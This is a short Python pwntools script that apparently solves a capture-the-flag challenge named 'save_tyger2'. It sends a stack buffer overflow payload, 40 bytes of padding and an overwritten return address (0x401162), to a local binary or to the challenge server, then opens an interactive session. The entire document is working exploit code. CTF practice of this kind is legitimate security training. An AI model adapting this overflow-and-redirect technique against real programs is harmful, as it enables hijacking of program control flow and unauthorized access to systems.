from pwn import *

DEBUG = False

if DEBUG:
    r = process("./save_tyger2")
    # gdb.attach(r, api=True)
else:
    r = remote("litctf.live", 31788)

payload = b"a"*40 + p64(0x0000000000401162)

r.sendline(payload)
r.interactive()